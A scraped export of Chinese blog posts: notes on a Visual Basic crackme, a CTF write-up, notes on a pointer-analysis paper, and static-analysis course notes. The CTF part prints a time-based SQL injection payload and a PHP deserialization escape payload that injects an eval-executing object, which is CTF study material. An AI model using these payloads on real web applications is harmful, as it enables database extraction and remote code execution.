EAX中的值，再压%d\n执行函数\n\n\n用XOR EAX EAX计算返回值 return 0\n删除main函数的栈帧\n把ebp的值给esp\npop ebp\n\n\n程序结束\n\n0x08 abex’ crackme #2要调试的abex‘s crackme #2文件由Visual Basic编写而成\n8.2 Visual Basic文件的特征8.2.1 VB专用引擎VB文件使用名为MSVBVM60.dll(Microsoft Visual Basic Virtual Machine60)的VB专用引擎(也称为The Thunder Runtime Engine)。举个使用VB引擎的例子，显示消息框时，VB代码中要调用MsgBox()函数。\n\n其实，VB编辑器真正调用的是MSVBVM60.dll里的rtcMsgBox()函数\n在该函数内部通过调用user32dIl里的MessageBoxW()函数( Win32 API)来工作\n也可以在VB代码中直接调用user32.dll里的MessageBoxW()。\n\n8.2.2 本地代码和伪代码根据使用的编译选项的不同，VB文件可以编译为本地代码(N code)与伪代码(Pcode)。\n\n本地代码一般使用易于调试器解析的IA-32指令\n而伪代码是一种解释器(Interpreter)语言，它使用由VB引擎实现虚拟机并可自解析的指令(字节码)。\n因此，若想准确解析VB的伪代码，就需要分析VB引擎并实现模拟器。\n\n\n\n\n\n\n\n提示\n伪代码具有与Java(Java虚拟机)、Python (Python专用引擎)类似的形态结构。使用伪代码的好处是非常方便代码移植(编写&#x2F;发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在指定平台上运行)。\n\n\n8.2.3 事件处理程序VB主要用来编写GUT程序，IDE用户界面本身也最适合于GUI编程。由于VB程序采用Windows操作系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码(希望调试的代码)，用户代码存在于各个事件处理程序(event handler)之中。\n就上述abex’crackme#2而言，用户代码在点击Check按钮时触发的事件处理程序内\n8.2.4 未文档化的结构体VB中使用的各种信息(Dialog、Control、Form、Module Function等)以结构体形式保存在文件内部。由于微软未正式公开这种结构体信息，所以调试VB文件会难一些。\n8.3 开始调试\nEP的地址为401238。\n\n401238地址处的PUSH 401E14命令用来把RT_MainStruct结构体的地址(401E14)压人栈。\n然后40123D地址处的CALL 00401232命令调用401232地址处的JMP DWORDPTR DS:[4010A0]指令。\n该JMP指令会跳转至VB引擎的主函数ThunRTMain()(前面压人栈的401E14的值作为ThunRTMain0的参数)。\n\n\n\n8.3.1 间接调用40123D地址处的CALL 401232命令用于调用ThunRTMain()函数，这里使用了较为特别的法。\n不是直接转到MSVBVM60.dll里的ThunRTMain()函数，而是通过中间401232地址处的JMP命令跳转。\n\n\n\n\n\n\n\n提示\n4010A0地址是IAT(Import Address Table,导入地址表)区域,包含着MSVBVM60.ThunRTMain()函数的实际地址。第13章将详细讲解IAT。\n\n\n8.3.2 RT_MainStruct结构体RT_MainStruct结构体的成员是其他结构体的地址。也就是说，VB引擎通过参数传递过来的RT_MainStruct结构体获取程序运行需要的所有信息。\n8.3.3 ThunRTMain()函数它存在于MSVBVM69.dll模块中，这里是VB引擎的代码\n8.4 分析crackme","slug":"re-engineer-core-principle","date":"2023-10-13T01:04:12.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"cdb488d648a90943d7354784532a6374","title":"巅峰极客","content":"巅峰极客hellosql\n这个题我知道是时间延迟注入，也知道用笛卡尔积，但是我当时的方法就是测不出来\t\n过滤了* if 空格\n\n时间延迟我当时用的是\nSELECT A.table_name FROM information_schema.columns A, information_schema.columns B\n\nboogipop的wp\nSELECT group_concat('1') FROM information_schema.columns A, information_schema.columns B,information_schema.columns c\n\n过滤if我当时用的是,但是当时测试并不成功\nSELECT fid from file WHERE fid=10 or COALESCE(1&lt;2, 1)\n\nboogipop的wp\nid=1'or+elt(3>2,(SELECT+group_concat('1')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'2\n\n\nMySQL 中的 ELT() 函数是一个字符串函数，用于根据一个给定的索引值，返回一个列表中对应索引位置的元素。该函数的语法如下，这样就会返回后面的语句:::info\n\n对于这个group_concat(‘1’)，我也看到有用sum(0)的，总之就是让它随便算一个，因为后面的表已经足够大了:::\n\n\nwp\n我在想是不是我的闭合有问题，导致我没有测试成功\nbut这个题真的很简单\n\nunserialize题目\nClick to see more\n&lt;?php\nsession_start();\ninclude_once \"my.php\";\ninclude_once \"function.php\";\n\nif (!isset($_SESSION['login'])) &#123;\n\techo '&lt;script>alert(`Login First!`);location.href=`./index.php`;&lt;/script>';\n&#125;\n\n$login = @unserialize(a($_SESSION['login']));//字符减少\necho $login;\n?>\n\n\n&lt;?php\n\nclass pull_it &#123;\n\tpublic $x;\n\n\tfunction __construct($xx) &#123;\n\t\t$this->x = $xx;\n\t&#125;\n\n\tfunction __destruct() &#123;\n\t\tif ($this->x) &#123;\n\t\t\t$preg_match = 'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);';\n\t\tif (eval($preg_match)) &#123;\n\t\t\techo $preg_match;\n\t\t\texit(\"save_waf\");\n\t\t&#125;\n\t\t@eval($this->x);\n\t\t&#125;\n\t&#125;\t\n&#125;\nclass push_it &#123;\n\tprivate $root;\n\tprivate $pwd;\n\n\tfunction __construct($root, $pwd) &#123;\n\t\t$this->root = $root;\n\t\t$this->pwd = $pwd;\n\t&#125;\n\t\n\t\tfunction __destruct() &#123;\n\t\tunset($this->root);\n\t\tunset($this->pwd);\n\t&#125;\n\n\tfunction __toString() &#123;\n\t\tif (isset($this->root) &amp;&amp; isset($this->pwd)) &#123;\n\t\t\techo \"&lt;h1>Hello, $this->root&lt;/h1>\";\n\t\t&#125;\n\t\telse &#123;\n\t\t\techo \"&lt;h1>out!&lt;/h1>\";\n\t\t&#125;\n\t&#125;\n\n\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\ninclude_once \"my.php\";\ninclude_once \"function.php\";\ninclude_once \"login.html\";\nsession_start();\n\nif (isset($_POST['root']) &amp;&amp; isset($_POST['pwd'])) &#123;\n\t$root = $_POST['root'];\n\t$pwd = $_POST['pwd'];\n\t$login = new push_it($root, $pwd);\n\t\n\t$_SESSION['login'] = b(serialize($login));//过滤后字符变多\n\tdie('&lt;script>location.href=`./login.php`;&lt;/script>');\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\nfunction b($data) &#123;\n\treturn str_replace('aaaa', 'bbbbbb', $data);\n&#125;\n\nfunction a($data) &#123;\n\treturn str_replace('bbbbbb', 'aaaa', $data);\n&#125;\n\n// echo strlen(a('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'));\n// echo strlen('\";s:3:\"pwd');\n\n?>\n\n\n\n思路\n\n类不一样咋办？\n\n\n我知道是反序列化，但是我在做题的时候，没想明白这里序列化的是push_it，但是反序列化需要用到pull_it，这怎么办？\n\n\n可以逃逸啊\n\n\n\n由于a函数是字符变少的，所以一定是字符减少的反序列化，既然普通的属性可以逃逸，那也可以逃逸pull_it这个类\n\n\n如何构造字符**b**的数量？\n\n\n\n根据我的笔记，字符减少的反序列化需要把前面的闭合，也就是我需要知道这部分的长度\n\n\n\n看到上面的属性是private，就需要格外注意，url编码后输出是**%00类%00属性**，第一行没输出是因为**%00**是不可见字符\n这里可以把它当成空格，按照空格来计算字符长度，但是传值时要编码成**%00**\n计算下面字符串的长度，因为6b ---&gt;  4a，少2个字符，现在需要空出28个字符，所以b的长度应为\n\n28 / 2 * 6 = 84\nprint_r(strlen('\";s:12:\" push_it pwd\";s:47:\"'));\n\n//长度为28\n\n\n所以给root和pwd传值\n\nroot=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n&amp;pwd=\";s:3:\"pwd\";O:7:\"pull_it\":1:&#123;s:1:\"x\";s:2:\"ls\";&#125;\n\n\n这里再传一个pwd是因为前面的pwd已经被包裹进去了，而push_it有两个属性，所以得加上。\n这里既可以只写pwd，也可以url编码后改为%00pull_it%00pwd，y4师傅的博客中说php7.1以上时对类属性不敏感，不写也可以正常输出\n\n\n\n反序列化时进行了正则匹配，需要绕过？\n\n\n\n无字母的webshell，上传数据包，用.配合通配符执行文件\n\n","slug":"巅峰极客","date":"2023-07-31T12:38:30.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"},{"id":"39f6a6f9864fa629c2ab8230b6f47fbc","title":"Context-Sensitivity-without-Contexts-PLDI23","content":"引言\n学完了南大软件分析的课程，关注了谭老师的个人主页。\n想着看一篇论文，能对学的内容有更好的理解。\n\nAbstractQ1：首先说上下文敏感的做法\n\n在不同上下文中分析，分离方法变量，和堆对象，也就是同时应用上下文敏感和堆上下文敏感\n\nQ2：但是这种方法带来了问题：\n\n因为需要clone不同的上下文，每个都要单独分析\n\nQ3：现在有了selective context-sensitivity\n\n只对选定的方法应用上下文敏感\n其余方法应用C.I.\n\n问题：啥是选定的方法呢？\nQ4：但是这种方法效率有限\n\n并没有从根本上改变上下文敏感性的主要方法\n\nbecause the selective approaches do notfundamentally alter the primary methodology of context sensitivity\nQ5：提出clone的本质\n\n不同上下文下，clone的主要目的是把merge到一个callee method的flow 过滤掉\n我的理解也就是不让他merge\n\nQ6：提出本文的方法\n从PFG的视角\n\nsuch effect can be simulated by cutting off (Cut) the edges that introduce precision loss to certain pointers \nadding Shortcut edges directly from source pointers to the target ones circumventing the method on PFG\n\nIntroduction\n指针分析是一组静态分析技术，旨在计算程序指针在程序执行期间可能指向的一组抽象值\n\nQ1：参考文献分别指出了\n\n传统的C.I.指针分析，和PFG的一些基本概念，指针集沿着PFG的边传播\n\nC.I.的低精度问题\n\n\nQ2：接着为了改善精度，就有了C.S.\n\n包括call site sensitivity\nobject sensitivity\ntype sensitivity\n\n但是即使应用最广泛的2obj sensitivity，在复杂的程序面前，也没法在短时间内分析完\nQ3：为了分析更复杂的程序，有了selective context-sensitivity\n就是关于如何选择上下文的，能让指针分析更快的，这里面还有他们自己之前提出的方法。\n\n这些方法需要预先分析选定一组方法\n接着只对选定的方法进行上下文敏感的分析。其余应用C.I.\n\n但是还是在纠结于怎么选，C.S.的核心方法没有改变\n\n仍然需要复制方法\n\n仍然需要在不同的上下文中分别分析每个方法的元素\n\n一旦其中几个威胁到可伸缩性，分析就会面临非常缓慢甚至不可扩展的风险\n\n\n这里的扩展性指的是特殊的方法么，就是不适用的？\nGPT\n\n可扩展性是指指针分析算法或技术能够有效地处理大型代码库和复杂程序的能力\n也就是随着代码量的增加，可以很好的应对，不是时间复杂度指数级的增长\n\nQ4：C.I.的原因是\n\n方法 m的数据流会merge，然后再流出去\n\nQ5：本文方法的核心\n\n不需预先分析\n只是在on-the-fly(动态执行)上下文不敏感的指针分析算法在PFG中\n\n它的核心是PFG(N,E)：\n\nN是PFG，node的集合和edges的集合\nE是边，包括\nedges to cut off\nshortcut edges to add\n\n\n\nwhich edges to cut off?\n\n切断这样的边：可能把方法内部merge的object flow，带到方法外部某处的边\n换句话说：精度损失的主要原因是流出去了，那我现在不让他流出去，在内部瞎转悠，又不会影响其他的方法\n\nwhere to add shortcuts？\n\n在object flow merge之前 locate 一下，作为source。上一步不是有cut edge么，cut edge的目标作为target，\n\nQ4：但是具体该怎么做呢？\nMotivating Example \nFigure1（a）\n\n对于这个程序，a就是应用上下文不敏感进行分析，和学的一样，会Merge\n\n如果用上下文敏感来进行分析的话，那就会把上下文clone两次，这样也会消耗很多资源\n\n\nFigure1（b）\n\n带x的箭头就是，cut off，blue的箭头代表添加的shortcut\n因为不准的原因是，第4行代码的store语句，会让数据流从item流到o15.item 和o20.item，因此把他cut\n让item1直接指向o15.item\n\n因此就是用C.I.的指针分析算法加上cut off和shortcut，就能得到和上下文敏感同样的精度\nThe cur-short approach ,Informally这一部分定义了对于不同代码的不同principle\nfile access pattern、container access pattern、local flow pattern\noverview通俗的解释本文的过程是，对于merge的数据流，cut掉出口，在PFG上添加shortcut\nLocal Pointers：指针p是方法m的局部变量，称为local pointers，否则p就是non local，当p在m的外部定义，或者p是一个instance field\nNebulous path, Entrance and Exit：\n\n\n这个紫色的框从item–&gt;o15.item–&gt;r，就是一个Nebulous path。serItem方法是Entrance，getItem方法是exit\n\n有两个setItem方法的non-local 指针，他们merge到了该方法的指针item(文中用s表示start开始)，最后会有一个分支，getItem方法的local 指针r，r 导出去了两个getItem方法的non-local指针。\n\nTarget and Source pointers:\nTarget：指的是所有p（Nebulous path)的end node的所有后继节点，他们接收merge的结果，也就是上图中的item1，item2\nSource：指的是所有P（Nebulous path)的start node的所有前驱节点，他们是merge贡献的来源，也就是上图中的result1，result2\n\n这个就很好理解了，然后作者说：\n\n他不会把已经添加到PFG中的边真正的cut掉，因为程序是动态的，你添加上了，就会有指针集的流到\n而是不添加应该cut的边\n\n为了有更好的精度，需要找到尽可能多的target,cut off这些会引起 指针分析精度丢失的边，并且对于每个Target，找到他对应的source，然后添加shortcut。\n但是对于真正的程序，很难找到一种通用的方法来处理所有的精度丢失问题。\n在分析时，必须确保分析的soundness。\n问题：是不是需要学一下指针分析课程的最后一节？\n对于一般的程序来说，主要的代码是file access pattern、container access pattern、local flow pattern，这三个会引起指针分析精度的丢失，因此重点讨论一下，在这三种情况下，entrance、exit、source、target分别对应的是啥。\n问题：一直在说没有上下文，不需要clone，不需要选择上下文，这个还没理解好。\nField Access PatternJava中有两种field，分别是load 和store\nhandling of Store\n对于x.f&#x3D;y，这种情况。\n\n方法m包含了start node，并且x和y来自于方法m的parameters(也就是Item item，因为这会在传参时候污染)或者variable\n\n这里的parameter，我理解就包括this，形参定义的参数\n\n\n不同的call的参数会在方法m内部merge\n\n\n这是导致指针集不准的原因\n\n这里看Figure1，不准的原因是会merge，而且这个item(3)还会传给this.item。\n\n所以，作者对于cut-shortcut的idea是\n对于cut\n\n首先找到 x.f &#x3D; y，这样的表达式，并且满足\n\nx和y都是方法m的参数(this或者形参)\nx和y没有重写，保证它确实是从call site处传过来的，也就是确实merge了\n\n\n如果发现了这样的statement，这就形成了nebulous path（参照前面nebulous path的定义，确实一个node就能形成，因为它进来是汇聚，出去是分支），此时方法m，就是entrance 和exit。\n\n此时的target就是x.f所访问的，也就是figule 1 (a)中的o15.item和o20.itemm\n\n把这个store的边 cut掉\n\n\n对于shortcut\n\nitem1就是source，o15.item是它对应的target，加上一条shortcut，item2是source,o20.item是target\n\nhandling of load\n对于load语句\nx &#x3D; y.f\n\ny来自于方法m的parameter\nx是方法m的返回值，并且x的值由y,f获得，对象在方法m内部merge了\n\n\n根据上面的规则\n\n方法getItem包括r\nthis是方法getItem的参数\nr是返回值\n\n作者的idea是cut off 方法m的return edges\n\n首先找到一个statement：x&#x3D;y.f\ny的值是方法m的参数，并且没有重定义\nx是m方法的返回值\n\n\ncut off return edges，从方法m到接收变量的这个边被cut掉\n\n对于上图的结果就是，cut掉r到result1，和r到result2，加一个o15.item到result1，和o20.item到result2 \nhandling of Nested Call for Field Access（处理字段访问的嵌套调用）如果对于嵌套的方法调用，按照上面的分析，就可能会有问题。\n比如这个\n\n这里显然是不能直接加t–&gt;o8.f和t–&gt;o10.f，这里我理解nebulous path的start node是t，所以source 就是t1 t2，target就是o8.f和o10.f，只是要一直向前找，找method的caller，caller的caller，直到找到真正的target\n详细的会在Section 4.2中说明\nContainer Access Pattern关于容器的处理，之前学的指针分析算法，并没有这部分的内容。\nHanding of Containers这里其实和上面是类似的，对于ArrayList来说，add方法，也是一个方法，那就也会merge。\n\n\n这里认为add方法是entrance，get方法是exit。\n\n那这里a b就是一个source，理解成 $Entrance_{cs}^{arg}$，当前调用点的参数\n\nx和y就是target，理解成$Exit_{cs}^{lhs}$，当前调用点exit方法的接收变量(lhs)\n\n所以就在对应的$Entrance_{cs}^{arg}$和$Exit_{cs}^{lhs}$上添加shortcut edges\n\n\nQ1：那如何判断entrance 和 exit是不是对应的呢？\n如果是同一个container，比如 line3的add（）和line4的get()，那entrance 和 exit肯定是Match的\n\n\n也就是看$Entrance_{cs}^{rv}$和$Exit_{cs}^{rv}$的指针集是否有重叠，指向同一个地方，是不是同一个调用点\n例如line 3的entrance rv是l1，line4 get方法是exit，它的rv是l1，他俩的指针集 overlap\n\n\n\n但是这种方法不能处理其他的容器，例如iterators和Map的keySet()，这是为啥呢？？1\nQ2：为了解决上面的，引入了Pointer-host map(ptH)\n现在我还不知道对应的rules是啥样的，只能按照当前的理解\n\n$pt_H(l1)&#x3D;{o_1}$表示arrlist o1 被assign 给了 l1\n\n\n因此如果$pt_H(Entrance_{cs}^{rv})$和$pt_H(Exit_{cs}^{rv})$ overlap，就认为他俩可能是同一个container，就在arg和lhs加一条edge,这里的rv是recive variable\n也就是在上面的例子中，\nline3中 的add的receiver variable是$pt_{H}$(l1)，line4的receiver variable也是ptH(l1)，因此就加一条shortcut edge，从a–&gt;x，类似的从b到y也加一个\n\n对应上面的Iterator来说，因为ptH(it1）&#x3D; pth(l1)&#x3D; {o1}，所以在l1和It1上加一条边\nHandling of Host-Dependent Objects.\n规则和前面一样，还是cut掉从exit到 $Exit_{cs}^{lhs}$的边，并且添加一个shortcut edge 从entrance arg到exit lhs\n\n不同的地方是要扩展entrance、exit和pth\n\n\n扩展exit\n\n现在认为next()就是exit\n\n扩展pth：\nhost-related pointer：Hptr，理解成Line 11 的it1   作为key\nhost object：H 理解成object o1\t\t\t\t\t\t\t作为value\nQ1：那如何通过Key获取value？\nTransfer methods：\n\niterator依赖于一个container，把container称为host，把iterator object称为host-dependent object\n\n如果一个host-dependent object是通过调用host H的类的方法m创建的，那么m称为一个Transfer。\n\n\nLine11的iterator()就是一个transfer method，it1就是Hptr指向的对象\n对于每个transfer的call site\n\n把receiver variable的host object传给LHS variable，也就是把o1传给ptH(it1)\n\n\nLocal Flow Pattern\nFormlism and soundnessPointer Analysis with cut-shortcut\n\n定义了指针分析的rules，大体上和之前学的都相同\ns–&gt;t表明s指向的t也指向，就是把s的指针集加到t中，所以也用了pt(s) 包含于 pt(t)这种表达\n\n对于Cut-Shortcut，定义下面三个集合：\n\ncutStores：是store statement的集合，如果一个 store statement j 在cutStore中，j生成的store edge就会被cut off\ncutReturns：是return variables的集合。如果一个return variable $m_{ret}$在cutReturns中，从$m_{ret}$到m的call site的LHS variable会被cut\n*$E_{SC}$*是shortcut edgs的集合。如果一个边 s –&gt;t加到$E_{SC}$中，就会被加到PFG中，那s指向的对象也会被t指向\n\nField  Access Pattern\nHandling of StoreARG2VAR\n\n方法m的形参是 $m_{pk}&#x3D;x$，方法中x没有被重定义\n把实参传递给x\n\nCutStore\n\nx和y都是从形参(形参也是从调用点的实参获得的)中获得的参数，且有i这样的statement\n\n如果i在cutStores中，就把\n\n\n\n\n。\nthis.f&#x3D;p 属于cutStore，  a1.f&#x3D;p — &gt;  a1.f &#x3D; t1\no8属于pt(a1)   从t1到08.f加一条边\n看一下这个rules：\n\n当不再有 ARG2VAR，也就是不再有参数传递，说明已经到顶了\n就加边\n\n\n\n\nhandling of Load根据上面的规则\n\n方法getItem包括r\nthis是方法getItem的参数\nr是返回值\n\n作者的idea是cut off 方法m的return edges\n\n首先找到一个statement：x&#x3D;y.f\ny的值是方法m的参数，并且没有重定义\nx是m方法的返回值\n\n\ncut off return edges，从方法m到接收变量的这个边被cut掉\n\n对于上图的结果就是，cut掉r到result1，和r到result2，加一个o15.item到result1，和o20.item到result2 \n\n\n就对着前面的定义理解就行了，挺好理解\n\n\n有可能方法中有黄色部分的两条语句，那为了保证这种情况也能满足，就定义了RelayEdge。\n\n\n\nContainer Access Pattern\n\n\nCutContainer：cut掉所有return edege，来自exit 的method\nShortcutContainer：添加边\nhost是container l1\no1属于pth（l1） 把参数传给\nHostSource和HostTarget就是在做Handing of Containers\nTransferHost：这个就是上面讲的transfermethod，比如对于\nit = l.iterator()\n\n也就是把pth(l) 给it\nCOLHOST：Collection包括 list set queue deque\n它在处理ArrayList l1 = new ArrayList() ，把o1给pth(o1)。\n\n这个我没太看懂\nLocal Flow PatternEvaluation用doop和Tai-e实现了上面这些rules。\n作者选取的精度指标是\ncast-resolution analysis：the number of casts that may fail—#fail-cast\n a method reachability analysis：the number of reachable methods—#reach-mtd\t\na devirtualization analysis: the number of virtual call sites that cannot be disambiguated into monomorphic calls  无法将代码中的调用区分为单态调用。  也就是当存在多个重载的方法时，找不到具体的方法\na call-graph building analysis ：the number of call graph edges\nSoundness（Recall）\n\n这里我理解指针分析的Recall就是正确识别所有可用的指针的能力\n\n作者又对不同的大型程序，分析了方法的效率。\n总结\n感觉大佬写的文章确实好，在学了课之后，有些地方很容易懂\n接下来看一下Tai-e的那篇文章，复现一下论文的代码\n\n","slug":"Context-Sensitivity-without-Contexts-PLDI23","date":"2023-10-08T05:40:18.000Z","categories_index":"","tags_index":"Program Analysis,论文","author_index":"XyM4ster"},{"id":"16dae33580f19f4496bcfc3620372612","title":"软件分析","content":"引言\n学这个的起因是想入门一下模糊测试方向，跟着知乎的学习路线，学了这个课程\n谭老师和李老师讲的非常非常好\n兜兜转转学这个已经2个月了，感觉很多地方还是不是理解的很明白\n\nProgramming Languages(PL)\n\n在运行程序前，分析程序可能有的问题\n\n静态分析是在编译时，在程序运行之前，判断一个程序是否满足一些性质\n\n\n\n\n对于这些interesting proverties，比如是否有空指针，是不能直接被给出准确的答案的\n\n\nsound包括truth\n\ncomplete爆出来的一定是truth\n\n\n从上面可以发现没有perfect，所以要么妥协soundness，要么妥协completeness\n妥协soundness就会产生漏报\n妥协completeness就会产生误报\n\n\n所以 几乎所有的静态分析都是sound，意思就是能多报几个，即使里面有误报，也不漏报   \n\n\n只有分析了 蓝色和 绿色两条路径，才能分析出 它是 not safe，所以要soundness\n\n\n第一种方法虽然准确度高，但是浪费内存\n确保soundness(准确度)，保证精度和速度的平衡\n第一步：先抽象\n\n\n\n\n没有确定的值，用新的符号表示\n\n第二步：转换规则\n\n第三步：根据上一步确定的规则计算\n\n\n可以看出静态分析是有用的，但是由于是sound，over-approximated，  对于3来说就是误报，因为他是9\n\n\n\nflow merge很重要，因为很难考虑所有情况\n\n\n\n总结Q1：静态分析和动态测试有什么不同？\n\n静态分析是在程序编译时进行分析\n\n**Q2：soundness和completeness **\n\n静态分析不能直接给出准确的答案，要么是soundness，也就是过近似，包括很多结果，但是会误报\n要么是completeness，很精确，但是会漏报\n静态分析都是soundness\n\nQ3：为什么静态分析需要soundness？\n\n很显然他需要报出所有可能的结果\n\nQ4：如何理解抽象和over-approximation？\n如果想在程序运行前判断这个程序，那就需要对程序中的一些运算进行抽象，形成一定的规则来进行判断\n\n抽象之后的结果是尽可能满足所有情况的，对于特殊情况，就会有错误，所以是over-approximation\n\nintermediate representation\nCompiler\n\n词法分析器（Scanner），结合正则表达式，通过词法分析（Lexical Analysis）将 source code 翻译为 token。\n\n语法分析器（Parser），结合上下文无关文法（Context-Free Grammar），通过语法分析（Syntax Analysis），将 token 解析为抽象语法树（Abstract Syntax Tree, AST）\n\n语义分析器（Type Checker），结合属性文法（Attribute Grammar），通过语义分析（Semantic Analysis），将 AST 解析为 decorated AST\n\nTranslator，将 decorated AST 翻译为生成三地址码这样的中间表示形式（Intermediate Representation, IR），并基于 IR 做静态分析（例如代码优化这样的工作）。\n\n\n经过前面所有的处理生成 IR ，静态分析器 对 IR进行分析 \nAST vs IR为什么Compiler中用IR而不是AST呢\n\n\nAST是high-level，接近语法结构的\nAST是依赖语言的\nAST适合快速的类型检查\nAST缺少控制流信息，IR中的go to可以轻易的看出控制流信息\n\nIR:3AC\n为什么叫3地址码？\n\n名称： a,b\n常量：3\n编译器生成的临时变量：t1,t2\n\n常见的 3AC 包括：\n\nx &#x3D; y bop z：双目运算并赋值，bop &#x3D; binary operator\nx &#x3D; uop z：单目运算并赋值，uop &#x3D; unary operator\nx &#x3D; y：直接赋值\ngoto L：无条件跳转，L &#x3D; label\nif x goto L：条件跳转\nif x rop y goto L：包含了关系运算的条件跳转，rop &#x3D; relational operator\n\n3AC in real static Analyzer SootSoot是个静态分析的框架，其中的IR是Jimple\n在Soot中，Java源代码首先被编译成Java字节码，然后将字节码转换为Jimple表示形式\nJimple：(Java Intermediate Language）是一种用于表示Java字节码的中间语言\njvm中的方法调用:（PL）\ninvokespecial：call constructor, call superclass method(调用父类方法)，call private methods \n\ninvokevirtual：call  instance methods（virtual dispatch 动态分配）\n\ninvokeinterface：call static methods\n\nmethod Signature：包含 class name（方法声明所在的类 ）  return type  method name(parameter1 type,parameter2 type)\n\n\n下面是一些Jimple和对应的Java程序\n\n方法调用\n\n\n\nspecialinvoke是在调用StringBuilder的构造器，void 表示没有返回值\n\nspecialinvoke $r3.&lt;java.lang.StringBuilder: void &lt;init&gt;()&gt;();  \n\n$r3表示临时变量，&lt;&gt;中的东西是method Signature, java.lang.StringBuilder就是所在的类, **&lt; init &gt;**是默认的构造函数\n\n$r3 = virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java, lang.String)&gt;(r1);\n\n是在$r3的基础上调用的方法， $r3是StringBuilder类，返回值是StringBuilder，调用append方法，java, lang.String是参数 类型\n\n\nmain方法调用\n\n\n如果没给显示的构造函数，就会默认的生成一个构造函数\n\n静态方法调用\n\n\nclinit：一个类的静态初始化的函数，用于在类记载过程中执行类的初始化\n:::tips\nJava虚拟机加载一个类时，它会首先检查是否存在类的静态初始化代码块（static &#123;&#125;），如果存在，则将这些代码块的内容放入&lt;clinit&gt;方法中。&lt;clinit&gt;方法会在类首次使用之前被调用，确保类的静态初始化在使用之前完成\n:::\nStatic Single Assignment(SSA）静态单赋值\n\n也就是每次都用一个最新的变量\n\n\n\n在merge的时候，会用$phi$，根据控制流的信息决定选择哪个变量\n\nControl Flow Analysis控制流分析（Control Flow Analysis）通常指的是构建控制流图（Control Flow Graph, CFG），并以 CFG 作为基础结构进行静态分析的过程。\n\n需要构建Control Flow Graph(CFG)\nCFG的node可以是一个单独的3AC，但是更常见的是一个Basic Blocks\n\nBasic Blocks需要满足以下性质：\n\n只能从块的第一条指令进入\n只能从块的最后一条指令离开\n\n\n\n\n\n\n\n提示\n\n这个算法逻辑感很强，值得反复考虑\n\n\n\n构建node\n入口只有一个，就是开始的指令\n出口只有一个，就是结束的指令\n\n\n\n方法：\n\n决定P的leaders：\n\n\n程序的第一条指令是leader\n\ngoto指向的指令是leader\n\n跳转指令的后一条指令是leader\n\n\n例子：\n\n从这个可以看出 因为(3)是(12)的target，所以(3)就不能放到第一个bbs中，否则程序有两个入口\n\n(4)接下来有可能跳转到(7)，所以(5)就不能加进来，否则程序有两个出口\n\n\n\n构建P的基本快\n\n\n就是从一个leader开始，到下一个leader的前一条指令\n\n\n构建边块A到块B有一条边当且仅当：\n\nA B之间有跳转，自然要添边\n\nAB紧挨着，A块的最后一条指令紧挨着B的第一条指令\n\n这种AB之间需要一条边\n但是不能是无条件的跳转\n\n\n\n\n从上可知\n\n由j–&gt;i的变化，变成从A—&gt;B的变换，现在变成了粗粒度的，也就是说A B之间指令的变换，也不影响跳转了。(原来假设i  变成i + 1，那 j–&gt; i，也要变成 j –&gt;i + 1)\n\n构建CFG\n除了构建好的基本块，我们还会额外添加两个结点，「入口（Entry）」和「出口（Exit）」\n这两个结点不对应任何 IR\n如果一个基本块的最后一条指令会让程序离开这段 IR，那么这个基本块就会有一条边指向出口。\n但是可能有个很多return，也就可能有很多出边\n\n\n\n总结Q1：compilers 和 static analyzers静态分析器的关系\n\n编译器的作用是将source code转换成machine code\n该过程中间经过词法分析、语法分析，语义分析，形成IR，静态分析器对IR进行分析。\n\nQ2：3AC\n\n3地址码就是中间表示intermediate representation，就是在字节码 和 机器码中间的一种表示\n在soot中，源代码—-&gt;字节码—&gt;jimple（也就是java的IR，Java Intermediate Language）—&gt; 机器码\n\nQ3：在IR的top中如何构建basic blocks？\n\n首先一个basic block包含了该部分中最大的3AC，满足只有一个入口，和一个出口\n接着，按照规则构建node，构建边，最后加上Entry和exit，就形成了完整的CFG。\n\nData Flow AnalysisData Flow Analysis数据流分析的核心：How data Flows on CFG？\n\n对数据的抽象( +  - T  unknown等)\n\nFlows：根据分析的类型，做出合适的估算，应该是sound的\n\nNode：数据如何transfer(转换函数)，比如 + - \n\nEdges：控制流如何处理\n\nCFG：一个程序\n\n\n不同的数据流分析，有着不同的data abstraction, flow safe-approximation策略，transfer functions&amp;control-flow handlings。\nPreliminaries of Data Flow AnalysisInput and Output States\n每一条IR的执行，都让状态从输入状态变成新的输出状态\n输入&#x2F;输出状态与语句前&#x2F;后的 program point 相关联。\n\n\n\n在数据流分析中，我们会把每个程序点关联一个数据值，代表从那一点中可观察到的抽象程序状态\n\n\n\n从pp中观察到抽象的状态，并组成一个集合\n\n关于转移方程约束的概念\n关于控制流约束的概念\n\nB的所有前驱的out的meet构成B的输入\n\nData Flow Analysis Applications不会涉及到的概念\n\n首先不存在方法调用，讲的是函数内部的\n之后讲跨函数的\n变量不涉及引用，也就是没有两个变量指向一个空间，在指针分析中讲\n\nReaching Definitions Analysismay analysis: 理解成集合的union\n就是所有情况都得考虑，may be true的都被报出来\n也就是有一个是true就行，所以应该考虑所有的path，所以应该union\nmust anaysis：理解成集合的交集^\n\nInput and Output States\n绿色的是红色的抽象\ndomain：值域\n对于程序中所有的in 和 out，找到一个solution,通过解析 safe-approximation中的约束规则，得出的solution 。这些约束规则基于transfer function(转换规则)，基于控制流信息\n通过解这些约束规则，得到solution\n\n用符号表示transer function\n\nTranser function\n对bbs中的每个执行f，那么最后得到的结果就是bss的transer function\n\n反向的时候先执行 fsn的 transer function，再执行fsn-1，\n\n上面黄色的代表：B的所有前驱的out的meet构成B的in\n下面粉色的out：B的后继的in的meet\n\n基本概念\n假定 x 有定值 d (definition)，如果存在一个路径，从紧随 d 的点到达某点 p，并且此路径上面没有 x 的其他定值点，则称 x 的定值 d 到达 (reaching) 